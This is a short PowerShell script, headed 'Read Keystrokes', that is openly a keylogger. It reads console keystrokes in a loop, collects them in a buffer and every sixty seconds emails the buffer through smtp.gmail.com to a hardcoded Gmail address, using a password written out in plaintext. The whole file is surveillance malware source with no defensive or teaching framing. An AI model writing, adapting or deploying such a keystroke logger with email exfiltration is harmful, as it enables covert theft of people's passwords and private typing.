# Read Keystrokes #

$sender    = "018213110x@gmail.com"
$recipient = "018213110x@gmail.com"
$subject   = "Report"
$password  = "P@ssw0rd!P@ssw0rd!"

function SendMail([string]$email){

    $message = new-object Net.Mail.MailMessage
    $message.From = "018213110x@gmail.com"
    $message.To.Add($email)
    $message.Subject = $subject
    $message.Body = $buffer
    #
    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($sender, $password);
    $smtp.send($message);
 }

$buffer = ""

while($True)
{
    $key = [System.Console]::ReadKey()

    if($key.Key -eq "Spacebar")
    {
        $key = " "
        $buffer += $key
    }
    else 
    {
        $buffer+= $key.Key    
    }

    Start-Sleep -Seconds 60

    SendMail -email $recipient
    
}   

